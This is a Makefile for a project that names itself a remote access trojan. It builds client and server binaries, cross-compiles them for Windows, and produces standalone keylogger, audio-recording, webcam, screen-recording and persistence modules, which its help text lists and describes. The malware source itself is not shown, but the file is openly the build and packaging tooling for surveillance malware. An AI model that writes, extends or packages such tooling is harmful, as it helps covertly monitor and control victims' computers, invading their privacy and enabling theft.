# Makefile for RAT project with automatic persistence

# Detect OS
UNAME_S := $(shell uname -s)
ifeq ($(OS),Windows_NT)
    DETECTED_OS := Windows
else
    DETECTED_OS := $(UNAME_S)
endif

# Compiler and flags
CC = gcc
BASE_CFLAGS = -Wall -Wextra -std=c99 -Iinclude
LDFLAGS = 

# OS-specific settings
ifeq ($(DETECTED_OS),Windows)
    # Windows-specific settings
    CFLAGS = $(BASE_CFLAGS) -D_WIN32_WINNT=0x0600
    LDFLAGS = -lws2_32 -ladvapi32 -lshell32 -lssl -lcrypto
    EXE_EXT = .exe
    RM = del /Q
    MKDIR = mkdir
    PATH_SEP = \\
else
    # Linux/Unix settings
    CFLAGS = $(BASE_CFLAGS) -D_GNU_SOURCE -D_POSIX_C_SOURCE=200809L
    LDFLAGS = -lssl -lcrypto
    EXE_EXT = 
    RM = rm -f
    MKDIR = mkdir -p
    PATH_SEP = /
endif

# Directories
SRC_DIR = src
INC_DIR = include
BIN_DIR = bin
DOCS_DIR = docs
MODULES_DIR = modules
BUILD_DIR = build

# Target executables
CLIENT_TARGET = $(BIN_DIR)/client$(EXE_EXT)
SERVER_TARGET = $(BIN_DIR)/server$(EXE_EXT)

# Module targets
LINUX_ONLY_MODULES = keylogger audiorecord webcam screenrecord
CROSS_PLATFORM_MODULES = persistence
MODULES = $(CROSS_PLATFORM_MODULES) $(LINUX_ONLY_MODULES)
MODULE_TARGETS = $(addprefix $(BUILD_DIR)/, $(MODULES))

# Source files
UTIL_SRC = $(SRC_DIR)/util.c
CLIENT_SRC = $(SRC_DIR)/client.c $(SRC_DIR)/persistence.c $(SRC_DIR)/crypto.c $(UTIL_SRC)
SERVER_SRC = $(SRC_DIR)/server.c $(SRC_DIR)/crypto.c $(UTIL_SRC)

# Object files (in src directory to keep things clean)
CLIENT_OBJ = $(CLIENT_SRC:.c=.o)
SERVER_OBJ = $(SERVER_SRC:.c=.o)

# Default target
all: $(BIN_DIR) $(CLIENT_TARGET) $(SERVER_TARGET)

# Build all modules
modules: $(BUILD_DIR) $(MODULE_TARGETS)

# Create bin directory
$(BIN_DIR):
ifeq ($(DETECTED_OS),Windows)
	if not exist $(BIN_DIR) $(MKDIR) $(BIN_DIR)
else
	$(MKDIR) $(BIN_DIR)
endif

# Create build directory for modules
$(BUILD_DIR):
ifeq ($(DETECTED_OS),Windows)
	if not exist $(BUILD_DIR) $(MKDIR) $(BUILD_DIR)
else
	$(MKDIR) $(BUILD_DIR)
endif

# Client executable
$(CLIENT_TARGET): $(CLIENT_OBJ) | $(BIN_DIR)
	$(CC) $(CLIENT_OBJ) -o $(CLIENT_TARGET) $(LDFLAGS)

# Server executable
$(SERVER_TARGET): $(SERVER_OBJ) | $(BIN_DIR)
	$(CC) $(SERVER_OBJ) -o $(SERVER_TARGET) $(LDFLAGS)

# Compile object files
$(SRC_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

# Build individual modules (statically linked for portability)
$(BUILD_DIR)/%: $(MODULES_DIR)/%.c | $(BUILD_DIR)
	$(CC) $(CFLAGS) -static $< -o $@$(EXE_EXT)

# Special rule for screenrecord module (requires X11 libraries)
$(BUILD_DIR)/screenrecord: $(MODULES_DIR)/screenrecord.c | $(BUILD_DIR)
ifeq ($(DETECTED_OS),Windows)
	$(CC) $(CFLAGS) $< -o $@$(EXE_EXT) -lgdi32 -luser32
else
	$(CC) $(CFLAGS) $< -o $@ -lX11 -lXext
endif

# Clean build files
clean:
ifeq ($(DETECTED_OS),Windows)
	if exist $(SRC_DIR)\\*.o $(RM) $(SRC_DIR)\\*.o
	if exist $(BIN_DIR) rmdir /S /Q $(BIN_DIR)
	if exist $(BUILD_DIR) rmdir /S /Q $(BUILD_DIR)
else
	$(RM) $(SRC_DIR)/*.o
	rm -rf $(BIN_DIR) $(BUILD_DIR)
endif

# Install targets (copies to common locations)
install-client: $(CLIENT_TARGET)
	cp $(CLIENT_TARGET) /usr/local/bin/rat-client || cp $(CLIENT_TARGET) ~/bin/rat-client || echo "Copy manually to desired location"

install-server: $(SERVER_TARGET)
	cp $(SERVER_TARGET) /usr/local/bin/rat-server || cp $(SERVER_TARGET) ~/bin/rat-server || echo "Copy manually to desired location"

# Development/testing targets
test-compile: all
	@echo "✅ Compilation successful!"
	@echo "   Client: $(CLIENT_TARGET)"
	@echo "   Server: $(SERVER_TARGET)"

# Debug build
debug: CFLAGS += -g -DDEBUG
debug: all

# Release build (optimized)
release: CFLAGS += -O2 -DNDEBUG
release: all

# Cross-compilation targets
windows: CC=x86_64-w64-mingw32-gcc
windows: CFLAGS=$(BASE_CFLAGS) -D_WIN32_WINNT=0x0600
windows: LDFLAGS=-lws2_32 -ladvapi32 -lshell32 -lssl -lcrypto
windows: EXE_EXT=.exe
windows: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) \
         $(addprefix $(BUILD_DIR)/, $(CROSS_PLATFORM_MODULES))

linux: CC=gcc
linux: CFLAGS=$(BASE_CFLAGS) -D_GNU_SOURCE -D_POSIX_C_SOURCE=200809L
linux: LDFLAGS=-lssl -lcrypto
linux: EXE_EXT=
linux: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) $(MODULE_TARGETS)

# Create source distribution
dist: clean
	@echo "Creating source distribution..."
	tar -czf rat-$(shell date +%Y%m%d).tar.gz \
		$(SRC_DIR)/ $(INC_DIR)/ $(DOCS_DIR)/ \
		Makefile README.md LICENSE TODO.md \
		--exclude-vcs

# Package the project (binary distribution)
package: release
	@echo "Creating binary package..."
	mkdir -p package/rat
	cp -r $(BIN_DIR) package/rat/
	cp README.md LICENSE package/rat/
	cd package && tar -czf rat-bin-$(shell date +%Y%m%d).tar.gz rat/
	rm -rf package/rat

# Show project structure
structure:
	@echo "Project Structure:"
	@tree -I '.git|.vscode|*.o' || find . -type f ! -path './.git/*' ! -path './.vscode/*' ! -name '*.o' | sort

# Help target
help:
	@echo "Available targets:"
	@echo "  all            - Build both client and server (default)"
	@echo "  modules        - Build all standalone modules"
	@echo "  client         - Build only the client"
	@echo "  server         - Build only the server"
	@echo "  clean          - Remove all build files"
	@echo "  debug          - Build with debug symbols"
	@echo "  release        - Build optimized release version"
	@echo "  windows        - Cross-compile for Windows using MinGW"
	@echo "  linux          - Compile for Linux"
	@echo "  install-client - Install client to system path"
	@echo "  install-server - Install server to system path"
	@echo "  test-compile   - Test compilation and show output paths"
	@echo "  dist           - Create source distribution tarball"
	@echo "  package        - Create binary distribution package"
	@echo "  structure      - Show project directory structure"
	@echo "  help           - Show this help message"
	@echo ""
	@echo "Available modules:"
	@echo "  keylogger      - Captures keyboard input"
	@echo "  audiorecord    - Audio recording via OSS/ALSA"
	@echo "  webcam         - Webcam capture via V4L2"
	@echo "  screenrecord   - Screen recording and screenshots via X11/framebuffer"
	@echo "  persistence    - Persistence mechanisms"
	@echo ""
	@echo "Cross-platform notes:"
	@echo "  On Windows: Use 'mingw32-make' instead of 'make'"
	@echo "  For Windows cross-compilation: Install mingw-w64-gcc"
	@echo "  Detected OS: $(DETECTED_OS)"

.PHONY: all modules clean install-client install-server test-compile debug release windows linux dist package structure help